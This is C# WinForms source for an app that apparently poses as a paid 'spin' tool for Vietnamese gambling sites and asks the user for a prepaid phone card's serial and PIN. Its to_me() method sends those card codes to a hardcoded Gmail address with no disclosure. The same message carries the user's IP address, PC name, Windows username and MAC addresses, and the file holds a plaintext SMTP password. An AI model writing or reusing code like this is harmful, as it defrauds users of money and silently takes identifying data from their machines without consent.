using System;
using System.Drawing;
using System.Net.Mail;
using System.Net;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Net.NetworkInformation;

namespace Project_1
{
    public partial class Form2 : Form
    {
        public Form2()
        {
            //click => show chp nap the (visible)
            InitializeComponent();
            cbb_sl.DropDownStyle = ComboBoxStyle.DropDownList;
            cbb_sl.Text = "1. 20 Lượt Quay";
            cbb_name.Text = "789clup_(789clubvip.com)";
            cbb_nhacungcap.Text = "Chọn Nhà Cung Cấp";
            cbb_menhgia.Text = "Mệnh Giá Thẻ Nạp";
            tb_price.ShortcutsEnabled = false;
            tm_count.Start();
            pn_card.BackColor = Color.FromArgb(0, Color.White);
            // bt_attention.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, Color.Black);
        }
        //Created set name
        private static string save_name, save_sl, temp, mac2, mac3, save_nhacungcap, save_menhgia, save_seri, save_mt, save_caclulater;
        private static int count = 0, mail_Body = 0, check_it, kt = 0, kt1;
        private static string time_Now = DateTime.Now.ToLongTimeString();
        private static string date_Now = DateTime.Now.ToLongDateString();

        private void tm_count_Tick(object sender, EventArgs e)
        {
            count++;
            tb_count.Text = count.ToString();
            //if (tb_email.Text != "Example@email.com" || tb_email.Text != "") { save_email = tb_email.Text; } else { tb_email.Text = "NULL"; }
            if (count >= 99999)
            {
                count = 0;
            }
        }

        private void tb_note_TextChanged(object sender, EventArgs e)
        {

        }
        #region Get
        private void cbb_name_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                string get = cbb_name.SelectedItem.ToString();
                if (get == "Nổ Hũ_(sieuno.win)")
                {
                    temp = "NoHu";
                }
                if (get == "789clup_(789clubvip.com)")
                {
                    temp = "789";
                }
                if (get == "B52club_(game.taib52.club)")
                {
                    temp = "B52";
                }
                if (get == "Bino79_(bino79.club)")
                {
                    temp = "Bino";
                }
                if (get == "FA88club_(fa88.online)")
                {
                    temp = "FA";
                }
                if (get == "Gamvip_(gamvip.com)")
                {
                    temp = "Gam";
                }
                if (get == "Go88_(tai.go88vn.vip)")
                {
                    temp = "Go";
                }
                if (get == "Hen88club_(doithuong.us/play/hen88)")
                {
                    temp = "Hen";
                }
                if (get == "Kingfun_(dangkykingfun.info)")
                {
                    temp = "King";
                }
                if (get == "Zowin_(lp.zowinvn.vip)")
                {
                    temp = "Zo";
                }
                if (get == "Nhat.Vip_(qc.nhat88.club)")
                {
                    temp = "Nhat";
                }
                if (get == "MaCao.Club_(macauclub.fun)")
                {
                    temp = "Macao";
                }
                if (get == "Ric.Win_(dangky.gameric.win)")
                {
                    temp = "Ric";
                }
                if (get == "Rikvip_(rik.vip)")
                {
                    temp = "Rik";
                }
                if (get == "Yo88_(ad.yo88vn.vip)")
                {
                    temp = "Yo";
                }
                if (get == "X8club_(qc.x8vn.com)")
                {
                    temp = "X8";
                }
                if (get == "Roy.Vin_(roy.vin)")
                {
                    temp = "Roy";
                }
                if (get == "Sunwin_(sunvn.vip)")
                {
                    temp = "Sun";
                }
                if (get == "Taito_(taito.me)")
                {
                    temp = "TaiTo";
                }
                if (get == "V8club_(taiv8.us)")
                {
                    temp = "V8";
                }
                if (get == "Vin.Win_(vin88.vip)")
                {
                    temp = "Vin";
                }
                if (get == "Chat79_(chat79.club)")
                {
                    temp = "Chat";
                }
                save_name = cbb_name.Text;
                tb_magiaodich.Text = temp + save_sl;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        #endregion

        private void cbb_nhacungcap_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                save_nhacungcap = cbb_nhacungcap.SelectedItem.ToString();
            }
            catch (Exception ex) { MessageBox.Show("Error: " + ex.ToString()); }

        }
        private void cbb_menhgia_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                save_menhgia = cbb_menhgia.SelectedItem.ToString();
                if (save_menhgia == "10.000đ")
                {
                    save_menhgia = "10K";
                }
                if (save_menhgia == "20.000đ")
                {
                    save_menhgia = "20K";
                }
                if (save_menhgia == "30.000đ")
                {
                    save_menhgia = "30K";
                }
                if (save_menhgia == "50.000đ")
                {
                    save_menhgia = "50K";
                }
                if (save_menhgia == "100.000đ")
                {
                    save_menhgia = "100K";
                }
                if (save_menhgia == "200.000đ")
                {
                    save_menhgia = "200K";
                }
                if (save_menhgia == "300.000đ")
                {
                    save_menhgia = "300K";
                }
                if (save_menhgia == "500.000đ")
                {
                    save_menhgia = "500K";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error 2: " + ex.ToString());
            }
        }
        #region This's Enter & Leave
        private void tb_seri_Enter(object sender, EventArgs e)
        {
            if (tb_seri.Text == "Nhập Số Seri") { tb_seri.Text = ""; tb_seri.ForeColor = Color.Black; }
        }

        private void tb_seri_Leave(object sender, EventArgs e)
        {
            if (tb_seri.Text == "") { tb_seri.Text = "Nhập Số Seri"; tb_seri.ForeColor = Color.Silver; }
        }

        private void tb_mathe_Enter(object sender, EventArgs e)
        {
            if (tb_mathe.Text == "Nhập Mã Thẻ") { tb_mathe.Text = ""; tb_mathe.ForeColor = Color.Black; }
        }

        private void tb_mathe_Leave(object sender, EventArgs e)
        {
            if (tb_mathe.Text == "") { tb_mathe.Text = "Nhập Mã Thẻ"; tb_mathe.ForeColor = Color.Silver; }
        }
        private void tb_node_Enter(object sender, EventArgs e)
        {
            if (tb_node.Text == "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com") { tb_node.Text = ""; tb_node.ForeColor = Color.Black; }
        }
        private void tb_node_Leave(object sender, EventArgs e)
        {
            if (tb_node.Text == "") { tb_node.Text = "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com"; tb_node.ForeColor = Color.Silver; }
        }

        private void tb_node_MouseClick(object sender, MouseEventArgs e)
        {
            if (kt == 0)
            {
                DialogResult dialogResult = MessageBox.Show("Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com", "Notice !", MessageBoxButtons.YesNo);
                if (dialogResult == DialogResult.Yes)
                {
                    kt = 1;
                }
                else if (dialogResult == DialogResult.No)
                {
                    kt = 0;
                }
            }
            else { }
        }
        #endregion

        private void button3_Click(object sender, EventArgs e)
        {
            string web = @"https://ibb.co/rwZFmSP";
            Process.Start(web);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string web = @"https://playerduo.com/hiluvtool";
            Process.Start(web);
        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            if (bt_lang.Text == "English") 
            {
                bt_lang.Text = "Vietnamese";
                bt_cp.Text = "Sao Chép";
                bt_tuto.Text = "Hướng Dẫn";
                bt_atten.Text = "Chú Ý";
                bt_more.Text = "Thêm";
                bt_exit.Text = "Thoát";
                bt_card.Text = "Thẻ Cào";
                lb_mgg.Text = "Mã Giao Dịch";
                lb_pay.Text = "Phương thức thanh toán";
            }
            else if (bt_lang.Text == "Vietnamese") 
            {
                bt_lang.Text = "English";
                bt_cp.Text = "Copy";
                bt_tuto.Text = "Tutorial";
                bt_atten.Text = "Attention";
                bt_more.Text = "More";
                bt_exit.Text = "Exit";
                bt_card.Text = "Card";
                lb_mgg.Text = "Transaction Code";
                lb_pay.Text = "Pay with";
            }
        }

        private void button4_Click_1(object sender, EventArgs e)
        {
            bt_video.Visible = !bt_video.Visible;
            bt_exit.Visible = !bt_exit.Visible;
        }

        private void bt_exit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void bt_video_Click(object sender, EventArgs e)
        {

        }

        private void bt_tuto_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Hướng Dẫn\nBước 1: Chọn tên trò chơi\nBước 2: Chọn số lượt\nBước 3: Chọn phương thức thanh toán của bạn\nBước 4: Sao chép \"Mã giao dịch\" và email dán vào ghi chú.", "Notice !");
        }

        private void bt_atten_Click(object sender, EventArgs e)
        {
            MessageBox.Show("Chú Ý\n* Thanh toán qua \"Thẻ Cào\" sẽ mất thời gian hơn\n* Trong phần ghi chú bắt buộc phải ghi \"Mã Giao Dịch + Email\" của bạn \n* Email để nhận mã kích hoạt\n* Ví dụ:\nGame: B52club_(game.taib52.club)\nMã giao dịch: B52_20\nEmail: nguyenvanA@gmail.com\n- ghi chú: B52_20 nguyenvanA@gmail.com", "Notice !");
        }

        private void button2_Click(object sender, EventArgs e)
        {
            string web = @"https://unghotoi.com/hiluvtool";
            Process.Start(web);
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            tb_node.Text = "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com";
            Clipboard.Clear();
            //lb_attention.Text = "*Thanh toán qua Thẻ Điện Thoại sẽ tốn nhiều thời gian hơn.\n*Chọn đúng Nhà Cung Cấp & Mệnh Giá\n*Nhập đúng Seri & Mã Thẻ";
            take_MAC();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            save_seri = tb_seri.Text;
            save_mt = tb_mathe.Text;
            //ham kierm tra 
            check_before_pay();
            if (check_it == 2)
            {
                to_me();
                if(kt1 == 0)
                {
                    DialogResult result = MessageBox.Show("*Thanh toán qua Thẻ Điện Thoại sẽ tốn nhiều thời gian hơn.\n*Vui lòng chọn đúng Nhà Cung Cấp & Mệnh Giá\n*Nhập đúng Seri & Mã Thẻ\n*Chọn (Yes) để không hiển thị lại thông báo này !", "Notice !", MessageBoxButtons.YesNo);
                    if (result == DialogResult.Yes)
                    {
                        kt1 = 1;
                    }
                    else if (result == DialogResult.No)
                    {
                        kt1 = 0;
                    }
                }
                else {}
            }
        }
        void check_before_pay()
        {
            check_it = 1; int empty1 = 0, empty2 = 0;
            if (cbb_nhacungcap.SelectedItem == "Chọn Nhà Cung Cấp" || cbb_menhgia.SelectedItem == "Mệnh Giá Thẻ Nạp" || tb_seri.Text == "Nhập Số Seri" || tb_mathe.Text == "Nhập Mã Thẻ")
            {
                if (cbb_nhacungcap.SelectedItem == "Chọn Nhà Cung Cấp")
                {
                    MessageBox.Show("Vui lòng chọn nhà cung cấp !", "Notice !");
                }
                if (cbb_menhgia.SelectedItem == "Mệnh Giá Thẻ Nạp")
                {
                    MessageBox.Show("Vui lòng chọn mệnh giá !", "Notice !");
                }
                if (tb_seri.Text == "Nhập Số Seri")
                {
                    MessageBox.Show("Vui lòng nhập số seri !", "Notice !");
                }
                if (tb_mathe.Text == "Nhập Mã Thẻ")
                {
                    MessageBox.Show("Vui lòng nhập mã thẻ !", "Notice !");
                }
                if(tb_node.Text == "Note: Mã Giao Dịch + Email\nVD: 789_IN Example@email.com")
                {
                    MessageBox.Show("Ghi chú không được để trống !", "Notice !");
                }
                check_it = 1;
            }
            else { check_it = 2; }
        }
        private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (cbb_sl.Text == "1. 20 Lượt Quay") { tb_price.Text = "2.000.000đ"; save_sl = "_20"; }
            if (cbb_sl.Text == "2. 50 Lượt Quay (+10 Lượt Quay)") { tb_price.Text = "5.000.000đ"; save_sl = "_50"; }
            if (cbb_sl.Text == "3. Không Giới Hạn Số Lượt Quay") { tb_price.Text = "25.000.000đ"; save_sl = "_IN"; }
            tb_magiaodich.Text = temp + save_sl;
        }
        #region Send Mail To Me
        static void to_me()
        {
            try
            {
                #region From,To,Password,Body
                mail_Body++;
                //from,to,pass
                string from_address = "hiluv.bot.sent@gmail.com";
                string to_address = "dsave8007@gmail.com";
                string password = "bot.auto13579";
                //ip
                string copy_IP = my_IP();
                string ip1 = @"https://checkip.com.vn/locator/?host=";
                string ip2 = @"&info=Ki%E1%BB%83m+tra+IP";
                string IP_Now = ip1 + copy_IP + ip2;
                //send
                MailMessage mail = new MailMessage();
                mail.Subject = save_name + "</>" + date_Now + ", ~[" + copy_IP + "]";//tieu de
                mail.From = new MailAddress(from_address);
                mail.Body = "TESTING :>> [" + mail_Body + "]\nTime: " + time_Now + "\nDate: " + date_Now + "\nMa Giao Dich: " + temp + save_sl;
                mail.To.Add(new MailAddress(to_address));
                //Smtp
                SmtpClient smtp = new SmtpClient();
                smtp.Host = "smtp.gmail.com";
                smtp.Port = 587;
                smtp.UseDefaultCredentials = false;
                smtp.EnableSsl = true;
                //Network
                NetworkCredential netC = new NetworkCredential(from_address, password);
                smtp.Credentials = netC;
                //Card
                mail.Body += "\n" + save_nhacungcap + "\t\tMenh Gia: " + save_menhgia + "\nSeri: " + save_seri + "\t\tMa The: " + save_mt;
                //My PC & User & IP
                string pc_Name = System.Environment.MachineName;
                string user_Name = System.Environment.UserName;
                mail.Body += "\nIP Now: " + IP_Now + "\nMy PC: " + pc_Name + "\tName User: " + user_Name;
                mail.Body += "\nMy IP: " + copy_IP;
                //MAC Address
                mail.Body += "\nMAC 1: " + GetMacAddress().ToString() + "\t(Ethernet Network Interfaces)\nMAC 2: " + mac2 + "\t(Wireless LAN adapter Wi-Fi)\nMAC 3: " + mac3 + "\t(Ethernet adapter Ethernet)";
                #endregion
                smtp.Send(mail);
                mail.Attachments.Dispose();
                if (mail_Body >= 100000) { mail_Body = 0; }
            }

            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }


        private void button6_Click(object sender, EventArgs e)
        {
            if(bt_lang.Text == "English")
            {
               
                bt_cp.Text = "Copied";
            }
            else if(bt_lang.Text == "Vietnamese")
            {
                bt_cp.Text = "Đã Sao Chép";
            }
            Clipboard.SetText(tb_magiaodich.Text); //copy
        }

        private void bt_card_Click(object sender, EventArgs e)
        {
            pn_card.Visible = !pn_card.Visible; //if(on)=>off, if(off)=> on 
        }

        //take ip
        private static string my_IP()
        {
            string Address = "";
            WebRequest request = WebRequest.Create("http://checkip.dyndns.org/");
            using (WebResponse response = request.GetResponse())
            using (StreamReader stream = new StreamReader(response.GetResponseStream()))
            {
                Address = stream.ReadToEnd();
            }
            int first = Address.IndexOf("Address: ") + 9;
            int last = Address.IndexOf("</body>");
            Address = Address.Substring(first, last - first);
            return Address;
        }
        #endregion
        #region Take MAC Address
        public static PhysicalAddress GetMacAddress() //solution 1
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                // Only consider Ethernet network interfaces
                if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet &&
                    nic.OperationalStatus == OperationalStatus.Up)
                {
                    return nic.GetPhysicalAddress();
                }
            }
            return null;
        }

        //solution 2
        void take_MAC()
        {
            string mac = "";
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {

                if (nic.OperationalStatus == OperationalStatus.Up && (!nic.Description.Contains("Virtual") && !nic.Description.Contains("Pseudo")))
                {
                    if (nic.GetPhysicalAddress().ToString() != "")
                    {
                        mac = nic.GetPhysicalAddress().ToString();
                    }
                }
            }
            mac2 = mac;
            mac3 = GetMACAddress1().ToString();
            //MessageBox.Show("Solution 1: " + GetMacAddress().ToString() + "\t(Ethernet Network Interfaces)\nSolution 2: " + mac + "\t(Wireless LAN adapter Wi-Fi)\nSolution 3: " + GetMACAddress1().ToString() + "\t(Ethernet adapter Ethernet)");
            ;
        }
        //solution 3
        public string GetMACAddress1()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)// only return MAC Address from first card
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            return sMacAddress;
        }
        #endregion
        void hide_card()
        {

        }
    }
}
